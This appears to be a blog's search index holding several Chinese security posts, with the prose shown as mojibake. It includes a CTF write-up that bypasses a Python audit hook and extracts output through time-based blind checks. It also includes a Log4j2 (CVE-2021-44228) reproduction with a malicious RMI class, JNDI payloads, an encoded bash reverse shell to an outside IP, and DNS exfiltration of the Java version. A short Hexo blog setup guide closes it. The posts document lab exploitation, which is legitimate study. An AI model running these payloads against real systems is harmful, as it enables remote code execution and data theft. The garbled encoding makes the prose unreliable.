[{"categories":["CTF"],"content":"ezoj è®¿é—® /source è¯»å–æºç ï¼Œå¤§æ¦‚å°±æ˜¯ä¼šæŠŠ python ä»£ç å†™åˆ°ä¸€ä¸ªæ–°çš„ py æ–‡ä»¶ç„¶åè¿›è¡Œæ‰§è¡Œï¼Œæœ‰ä¸ª hook å‡½æ•° import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\"import\",\"time.sleep\",\"builtins.input\",\"builtins.input/result\"]: raise RuntimeError sys.addaudithook(audit_checker)ç»•è¿‡ addaudithook å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html æœ€åæ„é€ ä¸‹é¢å‘½ä»¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œ import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"ls /\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)ä½†æ˜¯æ²¡æœ‰æ‰§è¡Œç»“æœå›æ˜¾ï¼Œå› ä¸ºç»™äº† time.sleep å¯ä»¥ä½¿ç”¨ï¼Œæœ¬æ¥æƒ³ç›´æ¥åœ¨è¿™ä¸ª py æ²™ç®±è¿›è¡Œæ—¶é—´ç›²æ³¨çš„ä½†æ˜¯æ— æ³•æŠŠç»“æœèµ‹å€¼å˜é‡ï¼Œæ‰€ä»¥é‡æ–°å†™ä¸ªæ–‡ä»¶ /tmp/1.py ï¼Œå†åœ¨è¿™ä¸ª py æ–‡ä»¶è¿›è¡Œç›²æ³¨ï¼Œæ„é€ è„šæœ¬ï¼š import base64 import requests import time flag='' strings = \"qwertyuiopasdfghjklzxcvbnm1234567890{}-\" payload1=f\"\"\" import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"python3 /tmp/1.py\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) \"\"\" for i in range(1, 50): for j in strings: poc1=f\"\"\"import time import os if os.popen('whoami').read({i})[{i}-1] == \"{j}\": time.sleep(2)else: print(\"\") \"\"\" poc2=base64.b64encode(poc1.encode('utf-8')).decode() payload2 = f\"\"\" import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"echo '{poc2}'|base64 -d\u003e/tmp/1.py\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) \"\"\" resp1 = requests.post( \"http://172.29.230.100:8089/api/submit\", json={\"problem_id\": \"0\", \"code\": payload2}, ) start_time = time.time() resp2 = requests.post( \"http://172.29.230.100:8089/api/submit\", json={\"problem_id\": \"0\", \"code\": payload1}, ) end_time = time.time() # è®°å½•è¯·æ±‚ç»“æŸæ—¶é—´ delay = end_time - start_time # è®¡ç®—å»¶è¿Ÿæ—¶é—´ if delay \u003e 2: flag += j print(flag) break else: flag += \"\\n\" breakæœ¬åœ°æ•ˆæœï¼Œ æœ€åç›²æ³¨è·å¾— flagã€‚ ","date":"2025-02-25","objectID":"/posts/aliyunctf/:1:0","tags":["CTF"],"title":"AliyunCTF 2025 éƒ¨åˆ†wp","uri":"/posts/aliyunctf/"},{"categories":["CTF"],"content":"æ‰“å¡OK å¼€é¢˜å°±ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä¸çŸ¥é“ code æ˜¯ä»€ä¹ˆæ„Ÿè§‰çˆ†ç ´ä¹Ÿæ˜¯ç™½çˆ†ç ´ï¼Œè¿›è¡Œç›®å½•æ‰«æ è®¿é—® /index.php~ å‘ç°å¯ä»¥æŸ¥çœ‹ index.php æºç ï¼Œå°è¯•å…¶ä»– php æ–‡ä»¶åååŠ ä¸ª~éƒ½å¯ä»¥è¯»å–æºç ï¼Œåœ¨ login.php æºç å¾—åˆ°ä¸ªæ•°æ®åº“è´¦æˆ·å¯†ç ï¼Œ ç„¶åå†åœ¨ ok.php æºç å‘ç°å­˜åœ¨ adminer_481.php è·¯å¾„ è®¿é—®è·¯å¾„æ˜¯ä¸ªæ•°æ®åº“ç®¡ç†æœåŠ¡ï¼Œ è¿æ¥åå¯ä»¥æ·»åŠ è´¦æˆ·è¿›è¡Œç™»å½•ï¼Œä½†æ˜¯ç™»å½•åå®¡åŠå¤©ä¹Ÿä¸çŸ¥é“æƒ³è€ƒä¸ªä»€ä¹ˆã€‚ ç„¶åçœ‹åˆ°è¿˜èƒ½æ‰§è¡Œ sql è¯­å¥ï¼Œå°è¯• sql å†™é©¬ï¼Œä½†æ˜¯åœ¨å†™é©¬æ—¶æŠ¥é”™äº†ï¼Œæ˜¾ç¤ºæƒé™ä¸è¶³ï¼Œ æœ€åå‘ç°è¿˜å¯ä»¥ root è´¦æˆ·è¿›è¡Œç™»å½•ï¼Œé»˜è®¤å¯†ç å°±ä¸º rootï¼Œ æˆåŠŸåè®¿é—®/shell.php ","date":"2025-02-25","objectID":"/posts/aliyunctf/:2:0","tags":["CTF"],"title":"AliyunCTF 2025 éƒ¨åˆ†wp","uri":"/posts/aliyunctf/"},{"categories":["javasec"],"content":"Apache_log4j2ï¼ˆCVE-2021-44228ï¼‰æ¼æ´å¤ç° ","date":"2025-02-09","objectID":"/posts/log4j2/:0:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"Log4j2 ä»‹ç» log4j2æ˜¯apacheä¸‹çš„javaåº”ç”¨å¸¸è§çš„å¼€æºæ—¥å¿—åº“ï¼Œæ˜¯ä¸€ä¸ªå°±Javaçš„æ—¥å¿—è®°å½•å·¥å…·ã€‚åœ¨log4jæ¡†æ¶çš„åŸºç¡€ä¸Šè¿›è¡Œäº†æ”¹è¿›ï¼Œå¹¶å¼•å…¥äº†ä¸°å¯Œçš„ç‰¹æ€§ï¼Œå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°ä¸ºæ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„å»ºç­‰ï¼Œè¢«åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨äºè®°å½•ç¨‹åºè¾“å…¥è¾“å‡ºæ—¥å¿—ä¿¡æ¯ã€‚ ","date":"2025-02-09","objectID":"/posts/log4j2/:1:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"æ¼æ´ä»‹ç» Apache Log4j2æ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ—¥å¿—è®°å½•å·¥å…·ï¼Œå½“å‰è¢«å¹¿æ³›åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œå¼€å‘è€…å¯ä»¥åˆ©ç”¨è¯¥å·¥å…·å°†ç¨‹åºçš„è¾“å…¥è¾“å‡ºä¿¡æ¯è¿›è¡Œæ—¥å¿—è®°å½•ã€‚ 2021å¹´11æœˆ24æ—¥ï¼Œé˜¿é‡Œäº‘å®‰å…¨å›¢é˜Ÿå‘Apacheå®˜æ–¹æŠ¥å‘Šäº†Apache Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºApache Log4j2æŸäº›åŠŸèƒ½å­˜åœ¨é€’å½’è§£æåŠŸèƒ½ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚ï¼Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä»è€Œè·å¾—ç›®æ ‡æœåŠ¡å™¨æƒé™ã€‚ åœ¨javaä¸­æœ€å¸¸ç”¨çš„æ—¥å¿—æ¡†æ¶æ˜¯log4j2å’Œlogbackï¼Œå…¶ä¸­log4j2æ”¯æŒlookupåŠŸèƒ½ï¼ˆæŸ¥æ‰¾æœç´¢ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œè®¾è®¡ä¹‹åˆçš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†æ–¹ä¾¿å¼€å‘è€…è°ƒç”¨ ä¾‹å¦‚å½“å¼€å‘è€…æƒ³åœ¨æ—¥å¿—ä¸­æ‰“å°ä»Šå¤©çš„æ—¥æœŸï¼Œåˆ™åªéœ€è¦è¾“å‡º${data:MM-dd-yyyy}ï¼Œæ­¤æ—¶log4jä¼šå°†${}ä¸­åŒ…è£¹çš„å†…å®¹å•ç‹¬å¤„ç†ï¼Œå°†å®ƒè¯†åˆ«ä¸ºæ—¥æœŸæŸ¥æ‰¾ï¼Œç„¶åå°†è¯¥è¡¨è¾¾å¼æ›¿æ¢ä¸ºä»Šå¤©çš„æ—¥æœŸå†…å®¹è¾“å‡ºä¸ºâ€œ08-22-2022â€ï¼Œè¿™æ ·åšå°±ä¸éœ€è¦å¼€å‘è€…è‡ªå·±å»ç¼–å†™æŸ¥æ‰¾æ—¥æœŸçš„ä»£ç ã€‚ è¡¨è¾¾å¼é™¤äº†æ”¯æŒæ—¥æœŸï¼Œè¿˜æ”¯æŒè¾“å‡ºç³»ç»Ÿç¯å¢ƒå˜é‡ç­‰åŠŸèƒ½ï¼Œè¿™æ ·æå¤§çš„æ–¹ä¾¿äº†å¼€å‘è€…ã€‚ä½†æ˜¯å®‰å…¨é—®é¢˜å¾€å¾€å°±æ˜¯å› ä¸ºâ€œå›¾æ–¹ä¾¿â€å¼•èµ·çš„ï¼Œæ¯•ç«Ÿè®¾è®¡è€…ä¹Ÿæ˜¯éœ€è¦åœ¨å®‰å…¨æ€§å’Œç”¨æˆ·ä½“éªŒä¹‹é—´åšä¸ªå¹³è¡¡ã€‚ å…¶å®æ‰“å°æ—¥æœŸï¼Œæ‰“å°ç³»ç»Ÿå˜é‡è¿™ç§å¯¹ç³»ç»Ÿè€Œè¨€æ„ä¸æˆä»€ä¹ˆå¨èƒï¼Œæœ€ç»ˆè¦çš„åŸå› æ˜¯log4jè¿˜æ”¯æŒJNDIåè®®ã€‚ ","date":"2025-02-09","objectID":"/posts/log4j2/:2:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"å½±å“ç‰ˆæœ¬ 2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-02-09","objectID":"/posts/log4j2/:3:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"ç¯å¢ƒæ­å»º pom.xml \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003elog4j2 çš„ä¸€äº›å®ç°æ–¹å¼ï¼Œä»€ä¹ˆ xmlï¼Œyamlï¼Œproperties ç­‰å¾ˆå¤šæ–¹å¼ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ç®€å•ç”¨ xml çš„æ–¹å¼æ¥å®ç°ï¼Œæ–‡ä»¶å¦‚ä¸‹ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºlog4j2.xmlï¼Œ \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 é…ç½®æ–‡ä»¶ --\u003e \u003c!-- æ—¥å¿—çº§åˆ« trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- è‡ªå®šä¹‰å±æ€§ --\u003e \u003cProperties\u003e \u003c!-- æ—¥å¿—æ ¼å¼(æ§åˆ¶å°) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- æ—¥å¿—æ ¼å¼(æ–‡ä»¶) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n æ—¥å¿—çº§åˆ«ï¼š%p%n æ—¥å¿—æ—¶é—´ï¼š%d%n æ‰€å±ç±»åï¼š%c%n æ‰€å±çº¿ç¨‹ï¼š%t%n æ—¥å¿—ä¿¡æ¯ï¼š%m%n \u003c/Property\u003e \u003c!-- æ—¥å¿—æ–‡ä»¶è·¯å¾„ --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e \u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003eç„¶åå†å†™ä¸€ä¸ªå®é™…åº”ç”¨çš„ demoï¼Œæ¯”å¦‚ä»æ•°æ®åº“è·å–åˆ°äº†ä¸€ä¸ª username ä¸º â€œadminâ€ï¼Œè¦æŠŠå®ƒç™»å½•è¿›æ¥çš„ä¿¡æ¯æ‰“å°åˆ°æ—¥å¿—é‡Œé¢ï¼Œè¿™ä¸ªè·¯å¾„ä¸€èˆ¬æœ‰ä¸€ä¸ª /logs çš„æ–‡ä»¶å¤¹çš„ã€‚ package org.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class Main { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"${java:os}\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); } } }è¿è¡Œç»“æœï¼Œ ä¸Šé¢è¯´äº† log4j2 ä¼šæŠŠ ${} åŒ…è£¹å†…å®¹è¿›è¡Œå•ç‹¬å¤„ç†ï¼Œåˆ©ç”¨ lookup åŠŸèƒ½è¿›è¡ŒæŸ¥æ‰¾ã€‚Log4j2 å†…ç½®äº†å¤šä¸ª Lookup å®ç°ï¼Œæ¯ä¸ª Lookup éƒ½æœ‰ä¸åŒçš„ç”¨é€”å’ŒåŠŸèƒ½ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ Lookup ç±»å‹ï¼š ${date}ï¼šè·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œæ”¯æŒè‡ªå®šä¹‰æ ¼å¼ã€‚ ${pid}ï¼šè·å–å½“å‰è¿›ç¨‹çš„ IDã€‚ ${logLevel}ï¼šè·å–å½“å‰æ—¥å¿—è®°å½•çš„çº§åˆ«ã€‚ ${sys:propertyName}ï¼šè·å–ç³»ç»Ÿå±æ€§çš„å€¼ï¼Œä¾‹å¦‚ ${sys:user.home} è·å–ç”¨æˆ·ä¸»ç›®å½•ã€‚ ${env:variableName}ï¼šè·å–ç¯å¢ƒå˜é‡çš„å€¼ï¼Œä¾‹å¦‚ ${env:JAVA_HOME} è·å– Java å®‰è£…è·¯å¾„ã€‚ ${ctx:key}ï¼šè·å–æ—¥å¿—çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼ˆThreadContextï¼‰ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ ${class:fullyQualifiedName:methodName}ï¼šè·å–æŒ‡å®šç±»çš„é™æ€æ–¹æ³•çš„è¿”å›å€¼ã€‚ ${mdc:key}ï¼šè·å– MDC (Mapped Diagnostic Context) ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ è¿™é‡ŒæŠŠä¸Šé¢çš„ admin æ›¿æ¢ä¸º ${sys:user.dir}ï¼Œå†æ¬¡è¿è¡Œï¼Œ è€Œé€ æˆæ¼æ´æ˜¯å› ä¸ºè¿™é‡Œçš„ lookup å®ƒæ˜¯åŸºäº jndi çš„ï¼Œè€Œ jndi é‡Œé¢æˆ‘ä»¬æ—©åœ¨ä¹‹å‰è¯´è¿‡ç›´æ¥è°ƒç”¨ lookup() æ˜¯ä¼šå­˜åœ¨æ¼æ´çš„ã€‚ ","date":"2025-02-09","objectID":"/posts/log4j2/:4:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"æ¼æ´å¤ç° è‡ªå·±ç¼–å†™ä¸€ä¸ª RMIServerï¼Œ package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMI_Server { void register() throws Exception{ LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"RMI_POC\",\"RMI_POC\",\"http://ip:6666/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"hello\",refObjWrapper); System.out.println(\"START RUN\"); } public static void main(String[] args) throws Exception { new RMI_Server().register(); } }æ­å»ºå¥½æ¶æ„çš„ RMI æœåŠ¡å™¨ï¼Œå¹¶ä¸”åœ¨è¿œç«¯æœåŠ¡å™¨ä¸Šæ”¾ç½®æ¶æ„ç±»ï¼ŒRMI_POC.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.Hashtable; public class RMIHello extends UnicastRemoteObject implements ObjectFactory { public RMIHello() throws RemoteException { super(); try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }ç¼–è¯‘ä¸º class å­—èŠ‚ç ï¼Œç„¶åå¯åŠ¨ http ç›‘å¬ï¼Œ payloadï¼š${jndi:rmi://localhost:1099/hello}ï¼Œæœ€åæˆåŠŸæ‰§è¡Œï¼Œ ç„¶åå†åœ¨ vulhub é¶åœºå¤ç°ä¸€æ¬¡ï¼Œæ­å»ºå¥½é¶åœºåè®¿é—® 8983 ç«¯å£ï¼Œä¼ å…¥ä¸‹é¢ payload éªŒè¯æ¼æ´ /solr/admin/cores?action=${jndi:ldap://620de897.log.dnslog.sbs.} dns æ”¶åˆ°è¯·æ±‚ï¼Œ è¿™é‡Œæ‰“ Ladpï¼Œå› ä¸ºæ˜¯æœ¬åœ°æ­å»ºçš„é¶åœºï¼Œæ‰€ä»¥æœ¬åœ°æ­å»º LdapServer æœåŠ¡ï¼Œç„¶ååœ¨è¿œç¨‹ç«¯è¿›è¡Œ http ç›‘å¬ï¼Œè¿œç¨‹ç«¯çš„æ¶æ„åˆ©ç”¨ç±»æ”¹ä¸ºåå¼¹ shell çš„å‘½ä»¤ï¼Œ import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class LDAP_POC implements ObjectFactory { public LDAP_POC() throws Exception{ try { Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }ä¼ å…¥ payloadï¼Œ ${jndi:ldap://ip:9999/LDAP_POC}æˆåŠŸåå¼¹ shell å°è¯•åˆ©ç”¨å·¥å…·æ¥è¿›è¡Œæ”»å‡»ï¼Œå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0ï¼Œç„¶åæ„å»ºå‘½ä»¤è¿›è¡Œç›‘å¬ï¼Œ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\" -A \"47.109.156.81\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i} å°±æ˜¯ exec é‡Œé¢æ‰§è¡Œçš„å‘½ä»¤ï¼Œ-A å‚æ•°æ˜¯æ”»å‡»æœº ipï¼Œ ç„¶åæ ¹æ® jdk ç‰ˆæœ¬é€‰æ‹© payload ä¼ å…¥ï¼Œè¿™ä¸ª jdk ç‰ˆæœ¬å¯ä»¥é€šè¿‡å‘½ä»¤ ${jndi:rmi://${sys:java.version}.vbdpkn.ceye.io} è¿›è¡Œ dns å¤–å¸¦æŸ¥çœ‹ï¼Œè¿™é‡Œé€‰æ‹© jdk1.8 ç‰ˆæœ¬çš„ï¼Œ ${jndi:ldap://47.109.156.81:1389/nvxwvy}æœ€åä¹Ÿèƒ½æˆåŠŸåå¼¹ shell ","date":"2025-02-09","objectID":"/posts/log4j2/:5:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"æ¼æ´åˆ†æ æ¥åˆ° PatternLayout#toSerializable æ–¹æ³•ï¼Œå¯¹ formatters è¿›è¡Œå¾ªç¯å¤„ç†ï¼Œ åœ¨å¾ªç¯åˆ°ç¬¬ä¸ƒæ¬¡æ—¶ï¼Œè·Ÿè¿›åˆ° format æ–¹æ³•ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ Log4j2 çš„ lookups åŠŸèƒ½ã€‚è¿™é‡Œæˆ‘ä»¬æ˜¯ lookups åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥ç»§ç»­å¾€ä¸‹èµ°ã€‚ä¼šéå† workingBuilder æ¥è¿›è¡Œåˆ¤æ–­ï¼›å¦‚æœ workingBuilder ä¸­å­˜åœ¨${ï¼Œé‚£ä¹ˆå°±ä¼šå–å‡ºä» $ å¼€å§‹çŸ¥é“æœ€åçš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸€æ­¥ æœ€åå¾—åˆ° value ä¸ºï¼Œ ç»§ç»­è·Ÿè¿› replace() æ–¹æ³•ï¼Œreplace() æ–¹æ³•é‡Œé¢è°ƒç”¨äº† substitute() æ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯å°† ${} ä¸­é—´çš„å†…å®¹å–å‡ºæ¥ï¼Œç„¶ååˆä¼šè°ƒç”¨ this.subtitute æ¥å¤„ç†ã€‚æœ€åè°ƒç”¨åˆ° resolveVariable æ–¹æ³•ï¼Œ resolverè§£ææ—¶æ”¯æŒçš„å…³é”®è¯æœ‰[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„jndi:xxxåç»­å°±ä¼šç”¨åˆ°JndiLookupè¿™ä¸ªè§£æå™¨ è¿™ä¸ª lookup() æ–¹æ³•ä¹Ÿå°±æ˜¯ jndi é‡Œé¢åŸç”Ÿçš„æ–¹æ³•ï¼Œåœ¨æˆ‘ä»¬è®© jndi å»è°ƒç”¨ rmi æœåŠ¡çš„æ—¶å€™ï¼Œæ˜¯è°ƒç”¨åŸç”Ÿçš„ lookup() æ–¹æ³•çš„ï¼Œæ˜¯å­˜åœ¨æ¼æ´çš„ã€‚ æœ€åæˆåŠŸæ‰§è¡Œã€‚ ","date":"2025-02-09","objectID":"/posts/log4j2/:6:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"æ¼æ´ä¿®å¤ æ›´æ–°log4jè‡³ rc2 é…ç½®é˜²ç«å¢™ç­–ç•¥ï¼Œç¦æ­¢ä¸»åŠ¨è¿æ¥å¤–ç½‘è®¾å¤‡ å‡çº§å—å½±å“çš„åº”ç”¨åŠç»„ä»¶ è¿‡æ»¤ç›¸å…³çš„å…³é”®è¯ï¼Œæ¯”å¦‚${jndi://*} é™åˆ¶JNDIé»˜è®¤å¯ä»¥ä½¿ç”¨çš„åè®® é™åˆ¶å¯ä»¥é€šè¿‡LDAPè®¿é—®çš„æœåŠ¡å™¨å’Œç±» å‚è€ƒï¼šhttps://www.freebuf.com/articles/web/341857.html å‚è€ƒï¼šhttps://www.freebuf.com/articles/web/380568.html ","date":"2025-02-09","objectID":"/posts/log4j2/:7:0","tags":["java","æ¼æ´å¤ç°"],"title":"Log4j2 æ¼æ´å¤ç°","uri":"/posts/log4j2/"},{"categories":null,"content":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:0:0","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Github Pages+ Hexo æ­å»ºä¸ªäººåšå®¢ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:0","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"ä¸€ã€ä¸‹è½½ Git gitæ˜¯ä¸€ä¸ªåŒ…ç®¡ç†å·¥å…·ï¼Œåœ¨linuxæ˜¯è‡ªå¸¦çš„ï¼Œwindowsä¸Šéœ€è¦ä¸‹è½½ã€‚ å‚è€ƒï¼šhttps://www.cnblogs.com/xueweisuoyong/p/11914045.html ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:1","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"äºŒã€ä¸‹è½½ Node.js \u0026 npm ä¸‹è½½å‚è€ƒï¼šhttps://blog.csdn.net/weixin_38610651/article/details/108721957 Node.js é»˜è®¤é…ç½®äº† npmï¼Œå› æ­¤ä¸éœ€è¦é¢å¤–ä¸‹è½½ï¼Œå¯ä»¥æ ¹æ®éœ€è¦é…ç½® npmä¸‹è½½è·¯å¾„ã€‚ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:2","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"ä¸‰ã€å®‰è£… Hexo æ‰§è¡Œå‘½ä»¤ npm install hexo-cli -gæ‰§è¡Œ hexo -version æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼Œ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:3","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"å››ã€æœ¬åœ°é¢„è§ˆ æ–°å»ºä¸€ä¸ªç”¨äºå­˜å‚¨åšå®¢æ•°æ®çš„ç›®å½•(å¦‚ D:\\hexo-blog)å¹¶ç¡®ä¿è¯¥ç›®å½•ä¸ºç©ºï¼Œéšååœ¨ç»ˆç«¯ä¸­æ‰§è¡Œï¼Œ hexo init ï¼ˆæ–‡ä»¶åï¼‰ï¼ˆå¯é€‰ï¼Œé»˜è®¤æœ¬æ–‡ä»¶å¤¹ï¼‰ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå³å¯æˆåŠŸåˆå§‹åŒ–ã€‚æ­¤æ—¶å¯ä½¿ç”¨ hexo s -g æœ¬åœ°é¢„è§ˆåˆå§‹åŒ–æˆåŠŸçš„åšå®¢ 